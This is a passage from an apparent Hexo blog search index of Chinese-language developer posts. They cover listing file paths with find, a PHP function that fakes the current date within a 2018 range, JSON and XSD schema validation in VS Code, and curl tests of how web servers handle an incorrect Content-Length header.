status</span><br></pre></td></tr></table></figure>\n<p>在複製所有路徑到編輯器再做修改<br>覺得還是有更快的方案</p>\n<a id=\"more\"></a>\n<p>後來有在網路上爬到一個發法<br>在想要的目錄下面開啟 cmd(git bash.exe)<br>執行<code>find .</code><br>會印出所有當下目錄檔案路徑</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . &gt; filepath.txt</span><br></pre></td></tr></table></figure>\n<p>可快速建立出來所有東西</p>\n<p>要切出 file 名稱<br>可以在 sublime Text 做正規化<code>[^/]+.php</code><br>收工 XDD</p>\n","categories":["程式心法"],"tags":["linux"]},{"title":"隨機當天指定固定日期方法","url":"/blog/2019/05/09/%E9%9A%A8%E6%A9%9F%E7%95%B6%E5%A4%A9%E6%8C%87%E5%AE%9A%E5%9B%BA%E5%AE%9A%E6%97%A5%E6%9C%9F%E6%96%B9%E6%B3%95/","content":"<p>最近專案目前沒有現在時間資料<br>只有過去資料(產生當日排程還沒寫完)<br>但是為了要讓當然排名正常<br>所以我想了一個寫指定抓固定日期方法</p>\n<a id=\"more\"></a>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fakeDay</span><span class=\"params\">( $nowDay = null )</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($nowDay))&#123;</span><br><span class=\"line\">        $nowDay = date(<span class=\"string\">'Y-m-d'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $today = $nowDay;</span><br><span class=\"line\">    $firstday = <span class=\"string\">'2018-01-01'</span>; <span class=\"comment\">//寫入有資料的區間</span></span><br><span class=\"line\">    $lastday  = <span class=\"string\">'2018-12-31'</span>;  <span class=\"comment\">//寫入有資料的區間</span></span><br><span class=\"line\">    $firstday_unixday = strtotime( $firstday ) / (<span class=\"number\">60</span>*<span class=\"number\">60</span>*<span class=\"number\">24</span>);</span><br><span class=\"line\">    $lastday_unixday  = strtotime( $lastday ) / (<span class=\"number\">60</span>*<span class=\"number\">60</span>*<span class=\"number\">24</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $range =  ($lastday_unixday - $firstday_unixday + <span class=\"number\">1</span> ) &gt; <span class=\"number\">0</span> ? ($lastday_unixday - $firstday_unixday + <span class=\"number\">1</span> ) : <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    $add_date = (strtotime($today)/(<span class=\"number\">60</span>*<span class=\"number\">60</span>*<span class=\"number\">24</span>)) % $range;</span><br><span class=\"line\"></span><br><span class=\"line\">    $fake_today = date(<span class=\"string\">'Y-m-d'</span>, strtotime(<span class=\"string\">\"$firstday + $add_date day\"</span>));</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $fake_today;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> fakeDay() . <span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> fakeDay(date(<span class=\"string\">'Y-m-d'</span>,strtotime(<span class=\"string\">'now + 1 day'</span>))) . <span class=\"string\">\"\\n\"</span>;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://sandbox.onlinephpfunctions.com/code/10c72c5b521557c14f61d73e702864037a9d2d52\" target=\"_blank\" rel=\"noopener\">http://sandbox.onlinephpfunctions.com/code/10c72c5b521557c14f61d73e702864037a9d2d52</a></p>\n<p>簡單小記</p>\n<ol>\n<li>PHP 參照運算式不能寫在 function 裡面，如這邊問題</li>\n<li>由於 php function 能設定預設值，但沒辦法<code>function fakeDay($nowDay = date(&#39;Y-m-d&#39;)){...}</code><br>正常會寫 isset()去做預設值方法</li>\n</ol>\n<p>參考連結:<br><a href=\"https://stackoverflow.com/questions/20520019/how-to-pass-current-year-as-default-argument-in-php-function\" target=\"_blank\" rel=\"noopener\">date - how to pass current year as default argument in php function - Stack Overflow</a></p>\n","categories":["PHP"],"tags":["php","date"]},{"title":"驗證快速檢查JSON方法","url":"/blog/2018/10/20/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/","content":"<p>最近收到一份JSON格式資料<br>要實作一個API程式<br>在沒有任何文件囧境<br>看完好幾千行JSON<br>後來用Firefox下比對JSON長度<br>但測試實候發現有些 integer 型態我傳成 string<br>我發現單純用Firefox肉眼看不行<br>在想有什麼實用工具可以驗證</p>\n<a id=\"more\"></a>\n<h2 id=\"檢查JSON-type\"><a href=\"#檢查JSON-type\" class=\"headerlink\" title=\"檢查JSON type\"></a>檢查JSON type</h2><h3 id=\"Paste-JSON-as-Code-vscode套件\"><a href=\"#Paste-JSON-as-Code-vscode套件\" class=\"headerlink\" title=\"Paste JSON as Code -vscode套件\"></a>Paste JSON as Code -vscode套件</h3><p><a href=\"https://marketplace.visualstudio.com/items?itemName=quicktype.quicktype\" target=\"_blank\" rel=\"noopener\">Paste JSON as Code - Visual Studio Marketplace</a><br><code>Paste JSON as Code</code> 可以產生JSON Schema<br>還可以產生測試程式<br>有測試nodejs，還是無法知道哪裡有問題<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">aa = require(&apos;./json_check&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">aa.testToJson(`&#123;</span><br><span class=\"line\">    &quot;test&quot;: &quot;test&quot;</span><br><span class=\"line\">&#125;`);</span><br></pre></td></tr></table></figure></p>\n<p>他還能產生<code>JSON schema</code><br>可以把JSON Schema貼到這個上面<br>下面會回傳錯誤訊息<br><a href=\"https://www.jsonschemavalidator.net/\" target=\"_blank\" rel=\"noopener\">JSON Schema Validator - Newtonsoft</a></p>\n<h3 id=\"線上驗證工具\"><a href=\"#線上驗證工具\" class=\"headerlink\" title=\"線上驗證工具\"></a>線上驗證工具</h3><p><code>JSON Schema Validator</code>   -   vscode套件本機好像失效，評價3顆星….<br><a href=\"https://omkarmore.wordpress.com/2017/04/07/json-schema/\" target=\"_blank\" rel=\"noopener\">Json Schema with VS Code – Omkar’s Tech Blog</a></p>\n<p>範例<br><a href=\"https://github.com/omkarmore83/json-schema-vscode-example\" target=\"_blank\" rel=\"noopener\">GitHub - omkarmore83/json-schema-vscode-example: Examples for Json Schema with Visual Studio code</a></p>\n<h2 id=\"內建VSCODE就有檢查工具\"><a href=\"#內建VSCODE就有檢查工具\" class=\"headerlink\" title=\"內建VSCODE就有檢查工具\"></a>內建VSCODE就有檢查工具</h2><p>內建就有的功能，但必須設定schema<br><a href=\"https://code.visualstudio.com/docs/languages/json#_json-schemas-settings\" target=\"_blank\" rel=\"noopener\">JSON editing in Visual Studio Code</a></p>\n<img src=\"/blog/2018/10/20/驗證快速檢查JSON方法/1.png\" title=\"設定地方\">\n<p>這邊可以選擇工作區域</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"json.schemas\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">\"fileMatch\"</span>: [</span><br><span class=\"line\">                <span class=\"string\">\".myconfig\"</span></span><br><span class=\"line\">            ],</span><br><span class=\"line\">            <span class=\"attr\">\"schema\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"$schema\"</span>: <span class=\"string\">\"http://json-schema.org/draft-04/schema#\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"properties\"</span>: &#123;</span><br><span class=\"line\">                    <span class=\"attr\">\"$schema\"</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"string\"</span>         </span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"attr\">\"patternProperties\"</span>: &#123;</span><br><span class=\"line\">                    <span class=\"attr\">\"Questions_(EN|DE)$\"</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">\"$ref\"</span> : <span class=\"string\">\"#/definitions/questions-schema\"</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"attr\">\"additionalProperties\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"definitions\"</span>: &#123;</span><br><span class=\"line\">                    <span class=\"attr\">\"questions-schema\"</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">\"type\"</span>:<span class=\"string\">\"array\"</span>,</span><br><span class=\"line\">                        <span class=\"attr\">\"items\"</span>: &#123;</span><br><span class=\"line\">                            <span class=\"attr\">\"$ref\"</span> : <span class=\"string\">\"#/definitions/question-schema\"</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    <span class=\"attr\">\"question-schema\"</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">\"properties\"</span>: &#123;</span><br><span class=\"line\">                            <span class=\"attr\">\"question\"</span> : &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"string\"</span></span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"option_1\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"$ref\"</span>: <span class=\"string\">\"#/definitions/option-schema\"</span>       </span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"option_2\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"$ref\"</span>: <span class=\"string\">\"#/definitions/option-schema\"</span>       </span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"option_3\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"$ref\"</span>: <span class=\"string\">\"#/definitions/option-schema\"</span>       </span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"option_4\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"$ref\"</span>: <span class=\"string\">\"#/definitions/option-schema\"</span>       </span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"correct_option\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"integer\"</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"minimum\"</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"maximum\"</span>: <span class=\"number\">4</span></span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"moreInfo\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"string\"</span></span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"level\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"integer\"</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"minimum\"</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"maximum\"</span>: <span class=\"number\">10</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Level inditates the deficulty of the question. Valid values between 1 and 10\"</span></span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"category\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"$ref\"</span>: <span class=\"string\">\"#/definitions/category-schema\"</span></span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"multimedia\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"array\"</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"items\"</span>: &#123;</span><br><span class=\"line\">                                    <span class=\"attr\">\"$ref\"</span>: <span class=\"string\">\"#/definitions/multimedia-item-schema\"</span></span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                        <span class=\"attr\">\"required\"</span>:[</span><br><span class=\"line\">                            <span class=\"string\">\"question\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"option_1\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"option_2\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"option_3\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"option_4\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"correct_option\"</span>                </span><br><span class=\"line\">                        ],</span><br><span class=\"line\">                        <span class=\"attr\">\"additionalProperties\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">                        <span class=\"attr\">\"defaultSnippets\"</span>: [</span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"label\"</span> : <span class=\"string\">\"New Question\"</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Creates a New Question template\"</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"body\"</span>: &#123;</span><br><span class=\"line\">                                    <span class=\"attr\">\"question\"</span>: <span class=\"string\">\"$1\"</span>,</span><br><span class=\"line\">                                    <span class=\"attr\">\"option_1\"</span>: <span class=\"string\">\"$2\"</span>,</span><br><span class=\"line\">                                    <span class=\"attr\">\"option_2\"</span>: <span class=\"string\">\"$3\"</span>,</span><br><span class=\"line\">                                    <span class=\"attr\">\"option_3\"</span>: <span class=\"string\">\"$4\"</span>,</span><br><span class=\"line\">                                    <span class=\"attr\">\"option_4\"</span>: <span class=\"string\">\"$5\"</span>,</span><br><span class=\"line\">                                    <span class=\"attr\">\"correct_option\"</span>: <span class=\"string\">\"^$6\"</span>                        </span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    <span class=\"attr\">\"category-schema\"</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">\"enum\"</span>: [</span><br><span class=\"line\">                            <span class=\"string\">\"GEOGRAPHY\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"HISTORY\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"MATH\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"CURRENT_AFFAIRS\"</span></span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    <span class=\"attr\">\"multimedia-item-schema\"</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"object\"</span>,</span><br><span class=\"line\">                        <span class=\"attr\">\"properties\"</span>: &#123;</span><br><span class=\"line\">                            <span class=\"attr\">\"id\"</span> : &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"string\"</span></span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"type\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"string\"</span></span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            <span class=\"attr\">\"path\"</span>: &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"string\"</span></span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                        <span class=\"attr\">\"required\"</span>: [</span><br><span class=\"line\">                            <span class=\"string\">\"id\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"type\"</span>,</span><br><span class=\"line\">                            <span class=\"string\">\"path\"</span></span><br><span class=\"line\">                        ],</span><br><span class=\"line\">                        <span class=\"attr\">\"additionalProperties\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    <span class=\"attr\">\"option-schema\"</span>: &#123;</span><br><span class=\"line\">                        <span class=\"attr\">\"oneOf\"</span>: [</span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"string\"</span></span><br><span class=\"line\">                            &#125;,</span><br><span class=\"line\">                            &#123;</span><br><span class=\"line\">                                <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"object\"</span>,</span><br><span class=\"line\">                                <span class=\"attr\">\"properties\"</span>: &#123;</span><br><span class=\"line\">                                    <span class=\"attr\">\"image\"</span>: &#123;</span><br><span class=\"line\">                                        <span class=\"attr\">\"type\"</span> : <span class=\"string\">\"string\"</span></span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        ]</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>當然全部都塞到這邊很難管理</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"json.schemas\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">\"fileMatch\"</span>: [</span><br><span class=\"line\">                <span class=\"string\">\"/lyric.api.json\"</span></span><br><span class=\"line\">            ],</span><br><span class=\"line\">            <span class=\"attr\">\"url\"</span>: <span class=\"string\">\"./lyric.schema.json\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>比較注意的地方<code>fileMatch</code>不需要加<code>.</code><br>加.反而找不到位置<br>可搭配<code>*</code>用在fileMatch</p>\n<img src=\"/blog/2018/10/20/驗證快速檢查JSON方法/2.jpg\" title=\"驗證地方\">\n<h2 id=\"其他工具\"><a href=\"#其他工具\" class=\"headerlink\" title=\"其他工具\"></a>其他工具</h2><p><a href=\"https://github.com/java-json-tools/json-schema-validator\" target=\"_blank\" rel=\"noopener\">GitHub - java-json-tools/json-schema-validator: A JSON Schema validation implementation in pure Java, which aims for correctness and performance, in that order</a></p>\n<p>一些JSON SCHEMA範例<br><a href=\"http://schemastore.org/json/\" target=\"_blank\" rel=\"noopener\">JSON Schema Store</a></p>\n<p>做完這個，我發現XML要怎麼快速檢單驗證呢<br>但發現XML有一個叫XSD</p>\n<p>一些工具如下，參考來源:<a href=\"https://oomake.com/question/14248\" target=\"_blank\" rel=\"noopener\">XML Schema(XSD)验证工具？ - 码客</a><br>Xerces<br>xmlstarlet<br><a href=\"https://www.xml-buddy.com/ValidatorBuddy.htm\" target=\"_blank\" rel=\"noopener\">XML validator and editor for Windows</a><br><a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=7973\" target=\"_blank\" rel=\"noopener\">Download XML Notepad 2007 from Official Microsoft Download Center</a><br><a href=\"https://medium.com/@ayawong/%E7%AD%86%E8%A8%98-java-ide-%E5%BE%9E-xsd-%E8%BD%89%E5%87%BA-xml-3fbd04e0bafc\" target=\"_blank\" rel=\"noopener\">筆記：Java IDE 從 XSD 轉出 XML – Aya Wong – Medium</a><br><a href=\"http://www.utilities-online.info/xsdvalidation/\" target=\"_blank\" rel=\"noopener\">W3C XML Schema (XSD) Validation online</a><br><a href=\"https://jax-work-archive.blogspot.com/2015/02/php-xsd-xml.html\" target=\"_blank\" rel=\"noopener\">Jax 的工作紀錄: [PHP][Java][C#] 用 XSD 驗證 XML</a></p>\n<p>最後找了範例用在<a href=\"http://www.utilities-online.info/xsdvalidation/\" target=\"_blank\" rel=\"noopener\">W3C XML Schema (XSD) Validation online</a><br>可以驗證成功<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE note SYSTEM \"http://www.w3school.com.cn/dtd/note.dtd\"&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>George<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>John<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don't forget the meeting!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xs:schema</span> <span class=\"attr\">xmlns:xs</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema\"</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">targetNamespace</span>=<span class=\"string\">\"http://www.w3school.com.cn\"</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.w3school.com.cn\"</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">elementFormDefault</span>=<span class=\"string\">\"qualified\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xs:element</span> <span class=\"attr\">name</span>=<span class=\"string\">\"note\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">xs:complexType</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">xs:sequence</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">xs:element</span> <span class=\"attr\">name</span>=<span class=\"string\">\"to\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xs:string\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">xs:element</span> <span class=\"attr\">name</span>=<span class=\"string\">\"from\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xs:string\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">xs:element</span> <span class=\"attr\">name</span>=<span class=\"string\">\"heading\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xs:string\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">xs:element</span> <span class=\"attr\">name</span>=<span class=\"string\">\"body\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"xs:string\"</span>/&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">xs:sequence</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">xs:complexType</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">xs:element</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">xs:schema</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>之後有用到，再寫一篇記錄出來</p>\n","categories":["實用工具"],"tags":["json"]},{"title":"遇到Content-Length不正確到底發生什麼情況","url":"/blog/2019/04/05/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/","content":"<p>最近公司有一個案子，對方用程式打 API 竟然會會帶<code>content-length:2</code>，但並未帶 body 值<br>導致程式會不正確，但對方說程式已經用現有的 function，所以沒辦法修正<br>最後這個問題還是沒法解決<br>這幾天研究<code>content-length:2</code>會影響什麼情形<br>在<code>公司</code>和<code>家</code>裡測試結果會不太一樣<del>讓我矇 B</del><br>所以測試的時候不知道發生什麼事情<br>這邊只記錄我測出來結果</p>\n<a id=\"more\"></a>\n<p>注意這邊的 Content-Length 都先只 request header 裡面<br>不是只 response Content-Length</p>\n<h2 id=\"介紹-request-Content-Length\"><a href=\"#介紹-request-Content-Length\" class=\"headerlink\" title=\"介紹 request Content-Length\"></a>介紹 request Content-Length</h2><p>簡單一句話，就是 POST DATA 資料傳給 Server 長度。</p>\n<p>有找到更短詳細介紹</p>\n<blockquote>\n<ul>\n<li>響應為 1xx，204，304 相應或者 head 請求，則直接忽視掉消息實體內容。</li>\n<li>如果有 Transfer-Encoding，則優先採用 Transfer-Encoding 裡面的方法來找到對應的長度。比如說 Chunked 模式。</li>\n<li>「如果 head 中有 Content-Length，那麼這個 Content-Length 既表示實體長度，又表示傳輸長度。如果實體長度和傳輸長度不相等(比如說設置了 Transfer-Encoding)，那麼則不能設置 Content-Length。如果設置了 Transfer-Encoding，那麼 Content-Length 將被忽視」。這句話翻譯的優點饒，其實關鍵就一點：有了 Transfer-Encoding，則不能有 Content-Length。</li>\n<li>通過服務器關閉連接能確定消息的傳輸長度。(請求端不能通過關閉連接來指明請求消息體的結束，因為這樣可以讓服務器沒有機會繼續給予響應)。這種情況主要對應為短連接，即非 keep-alive 模式。<br>HTTP1.1 必須支持 chunk 模式。因為當不確定消息長度的時候，可以通過 chunk 機制來處理這種情況。</li>\n<li>在包含消息內容的 header 中，如果有 content-length 字段，那麼該字段對應的值必須完全和消息主題裡面的長度匹配。<br>其實後面幾條幾乎可以忽視，簡單總結後如下：<br>1、Content-Length 如果存在並且有效的話，則必須和消息內容的傳輸長度完全一致。(經過測試，如果過短則會截斷，過長則會導致超時。)<br>2、如果存在 Transfer-Encoding(重點是 chunked)，則在 header 中不能有 Content-Length，有也會被忽視。<br>3、如果採用短連接，則直接可以通過服務器關閉連接來確定消息的傳輸長度。(這個很容易懂)<br>結合 HTTP 協議其他的特點，比如說 Http1.1 之前的不支持 keep alive。那麼可以得出以下結論：<br>1、在 Http 1.0 及之前版本中，content-length 字段可有可無。<br>2、在 http1.1 及之後版本。如果是 keep alive，則 content-length 和 chunk 必然是二選一。若是非 keep alive，則和 http1.0 一樣。content-length 可有可無。</li>\n</ul>\n</blockquote>\n<h2 id=\"靜態資源\"><a href=\"#靜態資源\" class=\"headerlink\" title=\"靜態資源\"></a>靜態資源</h2><p>先講一下，這邊靜態資源是指<code>*.jpg,*.png,*js,*.json</code><br>以下測試會以 nginx 為主</p>\n<h3 id=\"HTTP-Content-Length-數值不正確-可正常執行\"><a href=\"#HTTP-Content-Length-數值不正確-可正常執行\" class=\"headerlink\" title=\"HTTP Content-Length 數值不正確 可正常執行\"></a>HTTP Content-Length 數值不正確 可正常執行</h3><p>連<code>http</code>時候，<code>靜態</code>資源不管<code>Content-Length</code>帶多少(正確或不正確)，apache,nginx 都可以正常回傳程式<br>我在我的電腦裝 nginx 測試<br>雖然有些網站可能不正常，目前推測可能有防火牆關係<br>防火牆可能會分析這封包不正確，可能會阻擋</p>\n<p>不能正確連線 EX:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -v --request &quot;GET&quot; --header &quot;content-length:2&quot; http://www.cyut.edu.tw/~ywfan/index.htm</span><br><span class=\"line\">Note: Unnecessary use of -X or --request, GET is already inferred.</span><br><span class=\"line\">*   Trying 163.17.1.15...</span><br><span class=\"line\">* TCP_NODELAY set</span><br><span class=\"line\">* Connected to www.cyut.edu.tw (163.17.1.15) port 80 (#0)</span><br><span class=\"line\">&gt; GET /~ywfan/index.htm HTTP/1.1</span><br><span class=\"line\">&gt; Host: www.cyut.edu.tw</span><br><span class=\"line\">&gt; User-Agent: curl/7.58.0</span><br><span class=\"line\">&gt; Accept: */*</span><br><span class=\"line\">&gt; content-length:2</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n<p>可以正常連線，這邊隨便有找到一個可正常連線<br>我上面先前我有打可能會跟防火牆(這邊防火牆不是指 OS 防火牆)<br>因為我家可以正常打、公司那邊會不正常<br>所以可能被硬體防火牆(Web Application Firewall)阻擋</p>\n<p>家裡執行指令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> curl -v --request &quot;GET&quot; --header &quot;content-length:200&quot; http://jimmypm.ehosting.com.tw/a.htm</span><br><span class=\"line\">Note: Unnecessary use of -X or --request, GET is already inferred.</span><br><span class=\"line\">*   Trying 203.69.42.72...</span><br><span class=\"line\">* TCP_NODELAY set</span><br><span class=\"line\">* Connected to jimmypm.ehosting.com.tw (203.69.42.72) port 80 (#0)</span><br><span class=\"line\">&gt; GET /a.htm HTTP/1.1</span><br><span class=\"line\">&gt; Host: jimmypm.ehosting.com.tw</span><br><span class=\"line\">&gt; User-Agent: curl/7.58.0</span><br><span class=\"line\">&gt; Accept: */*</span><br><span class=\"line\">&gt; content-length:200</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&lt; HTTP/1.1 200 OK</span><br><span class=\"line\">&lt; Content-Type: text/html</span><br><span class=\"line\">&lt; Last-Modified: Thu, 04 Apr 2019 04:12:18 